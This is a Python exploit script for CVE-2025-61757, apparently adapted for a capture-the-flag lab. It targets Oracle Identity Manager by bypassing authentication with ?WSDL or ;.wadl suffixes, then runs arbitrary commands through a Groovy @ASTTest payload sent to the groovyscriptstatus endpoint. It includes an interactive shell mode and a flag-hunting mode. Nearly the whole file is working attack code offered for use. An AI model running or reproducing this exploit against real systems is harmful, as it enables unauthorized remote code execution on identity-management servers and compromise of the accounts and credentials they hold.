#!/usr/bin/env python3
"""
CVE-2025-61757 - Oracle Identity Manager Pre-Auth RCE Exploit
Based on Searchlight Cyber / AssetNote research

Vulnerability Chain:
1. Authentication Bypass: SecurityFilter regex flaw
   - Bypass with ?WSDL query parameter
   - Bypass with ;.wadl matrix parameter
   
2. RCE via Groovy Compilation:
   - Endpoint: /iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus
   - @ASTTest annotation executes code during compilation
   - No runtime execution needed

Author: Based on real CVE-2025-61757 technical analysis
"""

import requests
import argparse
import sys
from urllib.parse import urljoin

class CVE202561757Exploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
    def banner(self):
        print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘    CVE-2025-61757 - Oracle Identity Manager RCE         â•‘
â•‘    Pre-Authentication Remote Code Execution              â•‘
â•‘    Authentication Bypass + Groovy @ASTTest RCE           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
    
    def check_target(self):
        print("[*] Checking target...")
        try:
            r = self.session.get(f"{self.target}/identity/rest/v1/info", timeout=10)
            if r.status_code == 200:
                info = r.json()
                version = info.get('version', 'unknown')
                print(f"[+] Target: {info.get('product')} v{version}")
                if version in ['12.2.1.4.0', '14.1.2.1.0']:
                    print("[!] Vulnerable version detected!")
                return True
        except:
            print("[-] Cannot connect to target")
            return False
    
    def test_auth_bypass(self):
        print("\n[*] Step 1: Testing authentication bypass...")
        
        # Test 1: Normal request (should fail)
        r1 = self.session.get(f"{self.target}/iam/governance/applicationmanagement/api/v1/applications/templates")
        print(f"[*] Normal request: {r1.status_code}")
        
        # Test 2: WSDL bypass
        r2 = self.session.get(f"{self.target}/iam/governance/applicationmanagement/api/v1/applications/templates?WSDL")
        if r2.status_code == 200:
            print("[+] SUCCESS! ?WSDL bypass works")
            return 'wsdl'
        
        # Test 3: WADL bypass
        r3 = self.session.get(f"{self.target}/iam/governance/applicationmanagement/api/v1/applications/templates;.wadl")
        if r3.status_code == 200:
            print("[+] SUCCESS! ;.wadl bypass works")
            return 'wadl'
        
        print("[-] Authentication bypass failed")
        return None
    
    def exploit_rce_real(self, command, bypass_method='wsdl'):
        """
        Real Groovy @ASTTest exploit
        
        This is how the actual CVE works:
        @ASTTest annotation with CompilePhase.SEMANTIC_ANALYSIS
        executes code during compilation
        """
        print(f"\n[*] Step 2: Exploiting RCE with real Groovy payload...")
        
        # Real Groovy payload with @ASTTest
        groovy_payload = f"""
import groovy.transform.ASTTest
import org.codehaus.groovy.control.CompilePhase

class Exploit {{
    @ASTTest(phase = CompilePhase.SEMANTIC_ANALYSIS, value = {{
        Runtime.getRuntime().exec("{command}")
    }})
    static void main(String[] args) {{}}
}}
"""
        
        suffix = '?WSDL' if bypass_method == 'wsdl' else ';.wadl'
        url = f"{self.target}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus{suffix}"
        
        try:
            r = self.session.post(
                url,
                json={'groovyScript': groovy_payload},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', data.get('message', ''))
                print("[+] RCE Successful!")
                print(f"[+] Output:\n{output}")
                return True, output
            else:
                print(f"[-] RCE failed: {r.status_code}")
                return False, None
        except Exception as e:
            print(f"[-] Error: {e}")
            return False, None
    
    def exploit_rce_simple(self, command, bypass_method='wsdl'):
        """
        Simplified exploit for CTF (same endpoint, simpler payload)
        """
        print(f"\n[*] Step 2: Exploiting RCE (simple mode)...")
        
        suffix = '?WSDL' if bypass_method == 'wsdl' else ';.wadl'
        url = f"{self.target}/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus{suffix}"
        
        try:
            r = self.session.post(
                url,
                json={'script': command},
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            if r.status_code == 200:
                data = r.json()
                output = data.get('output', '')
                print("[+] RCE Successful!")
                print(f"[+] Output:\n{output}")
                return True, output
            else:
                print(f"[-] RCE failed: {r.status_code}")
                return False, None
        except Exception as e:
            print(f"[-] Error: {e}")
            return False, None
    
    def get_flag(self, bypass_method='wsdl'):
        print("\n[*] Step 3: Retrieving flag...")
        
        flag_locations = [
            'cat /flag.txt',
            'cat /home/flag.txt',
            'env | grep FLAG',
            'cat /app/flag.txt'
        ]
        
        for cmd in flag_locations:
            success, output = self.exploit_rce_simple(cmd, bypass_method)
            if success and output and 'FLAG{' in output:
                print(f"\n{'='*60}")
                print(f"ğŸš© FLAG FOUND: {output.strip()}")
                print(f"{'='*60}")
                return True
        
        print("[-] Flag not found in standard locations")
        return False
    
    def interactive_shell(self, bypass_method='wsdl'):
        print("\n[*] Starting interactive shell (type 'exit' to quit)...")
        
        while True:
            try:
                cmd = input("$ ")
                if cmd.lower() in ['exit', 'quit']:
                    break
                if cmd.strip():
                    self.exploit_rce_simple(cmd, bypass_method)
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break
    
    def run(self, mode='auto', command=None):
        self.banner()
        
        if not self.check_target():
            return False
        
        bypass = self.test_auth_bypass()
        if not bypass:
            print("\n[-] Target is not vulnerable or patched")
            return False
        
        print(f"\n[+] Authentication bypass successful using: {bypass}")
        
        if mode == 'real':
            # Use real Groovy @ASTTest payload
            cmd = command or 'whoami'
            self.exploit_rce_real(cmd, bypass)
        elif mode == 'auto':
            # Auto-get flag
            self.get_flag(bypass)
        elif mode == 'shell':
            # Interactive shell
            self.interactive_shell(bypass)
        elif mode == 'cmd':
            # Single command
            self.exploit_rce_simple(command, bypass)
        
        print("\n[+] Exploitation complete!")
        return True

def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-61757 Oracle Identity Manager RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Auto-get flag
  python3 exploit.py http://target:14000 --auto
  
  # Interactive shell
  python3 exploit.py http://target:14000 --shell
  
  # Execute single command
  python3 exploit.py http://target:14000 --cmd "whoami"
  
  # Use real Groovy @ASTTest payload
  python3 exploit.py http://target:14000 --real --cmd "id"
        """
    )
    
    parser.add_argument('target', help='Target URL (e.g., http://target:14000)')
    parser.add_argument('--auto', action='store_true', help='Auto-retrieve flag')
    parser.add_argument('--shell', action='store_true', help='Interactive shell')
    parser.add_argument('--cmd', help='Execute single command')
    parser.add_argument('--real', action='store_true', help='Use real Groovy @ASTTest payload')
    
    args = parser.parse_args()
    
    exploit = CVE202561757Exploit(args.target)
    
    if args.real:
        mode = 'real'
        command = args.cmd or 'whoami'
    elif args.shell:
        mode = 'shell'
        command = None
    elif args.cmd:
        mode = 'cmd'
        command = args.cmd
    else:
        mode = 'auto'
        command = None
    
    exploit.run(mode=mode, command=command)

if __name__ == '__main__':
    main()
